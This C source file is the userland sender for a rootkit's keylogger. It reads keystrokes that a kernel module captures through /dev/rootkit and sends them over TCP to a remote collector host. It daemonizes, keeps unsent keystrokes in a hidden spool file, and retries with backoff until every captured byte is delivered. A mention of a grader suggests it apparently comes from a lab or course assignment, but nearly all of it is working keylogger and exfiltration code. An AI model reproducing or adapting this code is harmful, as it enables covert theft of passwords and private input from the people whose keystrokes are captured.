/*
 * rootkit: sender -- the userland half of the keylogging feature.
 *
 *	rklog <REMOTE_HOST> [PORT] [-s SPOOL] [-d]
 *
 * It reads the ring buffer that kernel/log.c fills (exposed as
 * /dev/rootkit), and forwards it over TCP to the collector that the grader
 * runs on $REMOTE (./log, logsrc/collector.c, same port).
 *
 * Why the transport lives here and not in the kernel: the capture has to be
 * in the kernel, but a TCP session, retries and on-disk buffering are far
 * easier to get right in userland -- and a bug in this process cannot panic
 * the box.  The kernel side therefore only offers "give me the bytes that
 * piled up", which is exactly the read()/poll() pair below.
 *
 * Nothing may be lost while the collector is down:
 *
 *   - connected     -> bytes go into a 4 MB in-memory queue and straight out
 *   - disconnected  -> bytes are appended to a spool file (8 MB, oldest
 *                      dropped first) and replayed once the connection is back
 *   - spool replay  -> happens before newly captured bytes, so the remote log
 *                      stays in order; the file is truncated only after every
 *                      byte in it was handed to the socket, so a crash between
 *                      "sent" and "truncated" costs at most a few repeated
 *                      lines instead of losing them
 *
 * Reconnects back off exponentially (500 ms .. 30 s) and re-resolve the host
 * every time, so both `rklog 10.0.2.2` and `rklog collector.example` work even
 * if DNS or the DHCP address changes while the target is up.
 */

#include <sys/types.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define RK_DEV		"/dev/rootkit"
#define DEFAULT_PORT	9999
#define READ_CHUNK	4096
#define QUEUE_MAX	(4 * 1024 * 1024)
#define SPOOL_DEFAULT	"/var/log/.rklog.spool"
#define SPOOL_MAX	(8 * 1024 * 1024)
#define POLL_TIMEOUT_MS	1000
#define RETRY_MIN_MS	500
#define RETRY_MAX_MS	30000
#define DEV_RETRY_MS	1000

/* ------------------------------------------------------------------ */
/* in-memory queue                                                     */
/* ------------------------------------------------------------------ */

static char	queue[QUEUE_MAX];
static size_t	queue_head;		/* index of the oldest queued byte */
static size_t	queue_len;
static unsigned long queue_dropped;

static void
queue_drop(size_t len)
{
	if (len >= queue_len) {
		queue_head = 0;
		queue_len = 0;
		return;
	}
	queue_head = (queue_head + len) % QUEUE_MAX;
	queue_len -= len;
}

static void
queue_put(const void *data, size_t len)
{
	const char *src = data;
	size_t room, first, pos;

	if (len == 0)
		return;

	/* A single chunk larger than the queue: keep only the newest part. */
	if (len >= QUEUE_MAX) {
		src += len - QUEUE_MAX;
		queue_dropped += (unsigned long)(len - QUEUE_MAX + queue_len);
		queue_head = 0;
		queue_len = 0;
		len = QUEUE_MAX;
	}

	room = QUEUE_MAX - queue_len;
	if (len > room) {
		queue_dropped += (unsigned long)(len - room);
		queue_drop(len - room);
	}

	pos = (queue_head + queue_len) % QUEUE_MAX;
	first = MIN(len, QUEUE_MAX - pos);
	memcpy(&queue[pos], src, first);
	if (len > first)
		memcpy(&queue[0], src + first, len - first);
	queue_len += len;
}

/* ------------------------------------------------------------------ */
/* spool file                                                          */
/* ------------------------------------------------------------------ */

static int	spool_fd = -1;
static size_t	spool_size;		/* bytes in the file */
static size_t	spool_pos;		/* how far the queue was replayed */
static unsigned long spool_dropped;

static void
spool_open(const char *path)
{
	struct stat sb;

	spool_fd = open(path, O_RDWR | O_APPEND | O_CREAT | O_CLOEXEC, 0600);
	if (spool_fd < 0) {
		if (errno == ENOENT || errno == EACCES) {
			fprintf(stderr, "rklog: %s: %s; buffering in memory "
			    "only\n", path, strerror(errno));
			return;
		}
		fprintf(stderr, "rklog: %s: %s\n", path, strerror(errno));
		return;
	}

	if (fstat(spool_fd, &sb) == 0) {
		spool_size = (size_t)sb.st_size;
		spool_pos = 0;
		if (spool_size > 0)
			fprintf(stderr, "rklog: %lu bytes of unsent log "
			    "recovered from %s\n",
			    (unsigned long)spool_size, path);
	}
}

static void
spool_append(const void *data, size_t len)
{
	const char *src = data;
	size_t room;
	ssize_t n;

	if (spool_fd < 0 || len == 0)
		return;

	/* Hard cap: the oldest bytes go first, the newest always survive. */
	room = SPOOL_MAX - spool_size;
	if (len > room) {
		spool_dropped += (unsigned long)(len - room);
		src += len - room;
		len = room;
	}
	if (len == 0)
		return;

	while (len > 0) {
		n = write(spool_fd, src, len);
		if (n < 0) {
			if (errno == EINTR)
				continue;
			fprintf(stderr, "rklog: spool write: %s\n",
			    strerror(errno));
			return;
		}
		src += n;
		len -= (size_t)n;
		spool_size += (size_t)n;
	}
}

/*
 * Move spooled bytes back into the queue. Called only while connected, and
 * only when the queue has drained a bit, so a slow collector does not make
 * the queue churn through its own contents.
 */
static void
spool_pump(void)
{
	char buf[READ_CHUNK];
	size_t want;
	ssize_t n;

	if (spool_fd < 0 || spool_size == 0)
		return;
	if (queue_len > QUEUE_MAX / 2)
		return;
	if (spool_pos >= spool_size)
		return;

	want = spool_size - spool_pos;
	if (want > sizeof(buf))
		want = sizeof(buf);

	n = pread(spool_fd, buf, want, (off_t)spool_pos);
	if (n <= 0)
		return;

	queue_put(buf, (size_t)n);
	spool_pos += (size_t)n;
}

/*
 * Truncate only when everything in the file has actually been queued *and*
 * sent: that is the whole reason the offset is tracked separately.
 */
static void
spool_trim(void)
{
	if (spool_fd < 0 || spool_size == 0 || queue_len != 0)
		return;
	if (spool_pos < spool_size)
		return;

	if (ftruncate(spool_fd, 0) == 0) {
		spool_size = 0;
		spool_pos = 0;
	}
}

/* ------------------------------------------------------------------ */
/* TCP sink                                                            */
/* ------------------------------------------------------------------ */

static const char *collector_host;
static long	 collector_port = DEFAULT_PORT;

static int	sink_fd = -1;
static int	sink_connecting;
static long long retry_ms = RETRY_MIN_MS;
static long long next_try_ms;

static long long
now_ms(void)
{
	struct timespec ts;

	clock_gettime(CLOCK_MONOTONIC, &ts);

	return ((long long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000);
}

static int
sink_up(void)
{

	return (sink_fd >= 0 && !sink_connecting);
}

static void
sink_close(void)
{

	if (sink_fd >= 0) {
		close(sink_fd);
		sink_fd = -1;
	}
	sink_connecting = 0;
}

/*
 * Every failure funnels through here: report, close, and schedule the next
 * attempt with exponential backoff capped at RETRY_MAX_MS.
 */
static void
sink_backoff(const char *why)
{

	fprintf(stderr, "rklog: %s; retry in %lldms\n", why, retry_ms);
	sink_close();
	next_try_ms = now_ms() + retry_ms;
	retry_ms *= 2;
	if (retry_ms > RETRY_MAX_MS)
		retry_ms = RETRY_MAX_MS;
}

static int
sink_resolve(struct sockaddr_in *addr)
{
	struct addrinfo hints, *res;
	int rc;

	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;

	rc = getaddrinfo(collector_host, NULL, &hints, &res);
	if (rc != 0 || res == NULL) {
		sink_backoff(gai_strerror(rc));
		return (-1);
	}

	*addr = *(struct sockaddr_in *)(void *)res->ai_addr;
	addr->sin_port = htons((unsigned short)collector_port);
	freeaddrinfo(res);

	return (0);
}

static void
sink_start(void)
{
	struct sockaddr_in addr;
	char ip[INET_ADDRSTRLEN];

	if (sink_resolve(&addr) != 0)
		return;

	sink_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (sink_fd < 0) {
		sink_backoff(strerror(errno));
		return;
	}

	(void)fcntl(sink_fd, F_SETFL, fcntl(sink_fd, F_GETFL, 0) | O_NONBLOCK);

	{
		int one = 1;

		(void)setsockopt(sink_fd, SOL_SOCKET, SO_KEEPALIVE, &one,
		    sizeof(one));
		(void)setsockopt(sink_fd, SOL_SOCKET, SO_NOSIGPIPE, &one,
		    sizeof(one));
	}

	if (connect(sink_fd, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
		sink_connecting = 0;
		retry_ms = RETRY_MIN_MS;
		(void)inet_ntop(AF_INET, &addr.sin_addr, ip, sizeof(ip));
		fprintf(stderr, "rklog: collector %s:%ld connected\n",
		    collector_host, collector_port);
		return;
	}

	if (errno == EINPROGRESS || errno == EINTR) {
		sink_connecting = 1;
		(void)inet_ntop(AF_INET, &addr.sin_addr, ip, sizeof(ip));
		fprintf(stderr, "rklog: collector %s:%ld (%s:%d) connecting\n",
		    collector_host, collector_port, ip,
		    (int)ntohs(addr.sin_port));
		return;
	}

	sink_backoff(strerror(errno));
}

static void
sink_connect_done(void)
{
	int err = 0;
	socklen_t len = sizeof(err);

	if (getsockopt(sink_fd, SOL_SOCKET, SO_ERROR, &err, &len) < 0)
		err = errno;

	if (err != 0) {
		sink_backoff(strerror(err));
		return;
	}

	sink_connecting = 0;
	retry_ms = RETRY_MIN_MS;
	fprintf(stderr, "rklog: collector %s:%ld connected\n", collector_host,
	    collector_port);
}

/*
 * Push as much of the queue as the socket accepts. The queue is drained in
 * place, so a partially written chunk is retried from where it stopped.
 */
static void
sink_flush(void)
{
	size_t first;
	ssize_t n;

	while (sink_up() && queue_len > 0) {
		first = MIN(queue_len, QUEUE_MAX - queue_head);
		n = send(sink_fd, &queue[queue_head], first, 0);
		if (n < 0) {
			if (errno == EINTR)
				continue;
			if (errno == EAGAIN || errno == EWOULDBLOCK)
				return;
			sink_backoff(strerror(errno));
			return;
		}
		if (n == 0) {
			sink_backoff("collector closed the connection");
			return;
		}

		queue_head = (queue_head + (size_t)n) % QUEUE_MAX;
		queue_len -= (size_t)n;

		if ((size_t)n < first)
			return;		/* socket buffer is full */
	}
}

/*
 * Last resort on shutdown: whatever is still queued and could not be sent
 * goes to disk, so the next start of the daemon replays it instead of losing
 * the last few keystrokes before a reboot.
 */
static void
queue_to_spool(void)
{
	size_t first;

	while (queue_len > 0) {
		first = MIN(queue_len, QUEUE_MAX - queue_head);
		spool_append(&queue[queue_head], first);
		queue_head = (queue_head + first) % QUEUE_MAX;
		queue_len -= first;
	}
}

/* ------------------------------------------------------------------ */
/* device                                                              */
/* ------------------------------------------------------------------ */

static int
dev_open(void)
{
	int fd = open(RK_DEV, O_RDONLY | O_NONBLOCK | O_CLOEXEC);

	if (fd < 0)
		return (-1);

	return (fd);
}

/* ------------------------------------------------------------------ */
/* main                                                                */
/* ------------------------------------------------------------------ */

static volatile sig_atomic_t stop_flag;

static void
on_signal(int sig)
{

	(void)sig;
	stop_flag = 1;
}

static void
usage(const char *prog)
{

	fprintf(stderr, "Usage: %s <REMOTE_HOST> [PORT] [-s SPOOL] [-d]\n"
	    "  -s PATH  unsent-data file (default %s)\n"
	    "  -d       daemonize\n", prog, SPOOL_DEFAULT);
	exit(EXIT_FAILURE);
}

int
main(int argc, char *argv[])
{
	const char *spool_path = SPOOL_DEFAULT;
	struct sigaction sa;
	struct pollfd pfd[2];
	const char *host = NULL;
	int daemonize = 0;
	int dev_fd, dev_idx, sink_idx;
	int i, nfds, ready, timeout;
	long long dev_next = 0;
	char chunk[READ_CHUNK];
	ssize_t n;
	char *end;

	for (i = 1; i < argc; i++) {
		if (strcmp(argv[i], "-d") == 0) {
			daemonize = 1;
		} else if (strcmp(argv[i], "-s") == 0) {
			if (++i >= argc)
				usage(argv[0]);
			spool_path = argv[i];
		} else if (argv[i][0] == '-' && argv[i][1] != '\0') {
			usage(argv[0]);
		} else if (host == NULL) {
			host = argv[i];
		} else {
			errno = 0;
			collector_port = strtol(argv[i], &end, 10);
			if (errno != 0 || *end != '\0' || collector_port <= 0 ||
			    collector_port > 65535) {
				fprintf(stderr, "rklog: bad port: %s\n",
				    argv[i]);
				return (1);
			}
		}
	}

	if (host == NULL)
		usage(argv[0]);

	collector_host = host;

	memset(&sa, 0, sizeof(sa));
	sa.sa_handler = on_signal;
	sigemptyset(&sa.sa_mask);
	(void)sigaction(SIGINT, &sa, NULL);
	(void)sigaction(SIGTERM, &sa, NULL);

	signal(SIGPIPE, SIG_IGN);

	if (daemonize && daemon(0, 0) != 0) {
		fprintf(stderr, "rklog: daemon: %s\n", strerror(errno));
		return (1);
	}

	spool_open(spool_path);

	dev_fd = dev_open();
	if (dev_fd < 0)
		fprintf(stderr, "rklog: %s: %s; waiting for the module\n",
		    RK_DEV, strerror(errno));

	fprintf(stderr, "rklog: forwarding %s to %s:%ld\n", RK_DEV,
	    collector_host, collector_port);

	for (;;) {
		if (stop_flag)
			break;

		if (dev_fd < 0 && now_ms() >= dev_next) {
			dev_fd = dev_open();
			if (dev_fd < 0)
				dev_next = now_ms() + DEV_RETRY_MS;
		}

		if (sink_fd < 0 && now_ms() >= next_try_ms)
			sink_start();

		nfds = 0;
		dev_idx = -1;
		sink_idx = -1;

		if (dev_fd >= 0) {
			pfd[nfds].fd = dev_fd;
			pfd[nfds].events = POLLIN;
			pfd[nfds].revents = 0;
			dev_idx = nfds++;
		}

		if (sink_fd >= 0) {
			/*
			 * Only ask for POLLOUT when there is something to
			 * write; otherwise the loop would spin on a writable
			 * socket.
			 */
			pfd[nfds].fd = sink_fd;
			pfd[nfds].events = (sink_connecting || queue_len > 0) ?
			    POLLOUT : 0;
			pfd[nfds].revents = 0;
			sink_idx = nfds++;
		}

		timeout = POLL_TIMEOUT_MS;
		if (sink_fd < 0) {
			long long wait = next_try_ms - now_ms();

			if (wait < 0)
				wait = 0;
			if (wait < timeout)
				timeout = (int)wait;
		}

		ready = poll(pfd, (nfds_t)nfds, nfds > 0 ? timeout : 0);
		if (ready < 0) {
			if (errno == EINTR)
				continue;
			fprintf(stderr, "rklog: poll: %s\n", strerror(errno));
			break;
		}
		if (stop_flag)
			break;

		/* Collector side. */
		if (sink_idx >= 0 && pfd[sink_idx].revents != 0) {
			if (sink_connecting)
				sink_connect_done();
			else if (pfd[sink_idx].revents & (POLLOUT | POLLERR |
			    POLLHUP))
				sink_flush();
		}

		/* Kernel side. */
		if (dev_idx >= 0 && (pfd[dev_idx].revents & (POLLIN |
		    POLLRDNORM))) {
			n = read(dev_fd, chunk, sizeof(chunk));
			if (n > 0) {
				if (sink_up())
					queue_put(chunk, (size_t)n);
				else
					spool_append(chunk, (size_t)n);
			} else if (n < 0 && errno != EAGAIN &&
			    errno != EWOULDBLOCK && errno != EINTR) {
				fprintf(stderr, "rklog: read: %s\n",
				    strerror(errno));
				close(dev_fd);
				dev_fd = -1;
				dev_next = now_ms() + DEV_RETRY_MS;
			}
		} else if (dev_idx >= 0 && (pfd[dev_idx].revents & (POLLHUP |
		    POLLERR | POLLNVAL))) {
			/* Module unloaded; wait for it to come back. */
			close(dev_fd);
			dev_fd = -1;
			dev_next = now_ms() + DEV_RETRY_MS;
		}

		/* Anything spooled comes back into the queue, then goes out. */
		if (sink_up()) {
			spool_pump();
			sink_flush();
			spool_trim();
		}

		if (queue_dropped > 0 || spool_dropped > 0) {
			fprintf(stderr, "rklog: overflow, dropped %lu queue / "
			    "%lu spool bytes\n", queue_dropped,
			    spool_dropped);
			queue_dropped = 0;
			spool_dropped = 0;
		}
	}

	/* Best effort: do not leave queued bytes unsent on a clean stop. */
	sink_flush();
	queue_to_spool();

	if (dev_fd >= 0)
		close(dev_fd);
	if (spool_fd >= 0)
		close(spool_fd);
	sink_close();

	return (0);
}
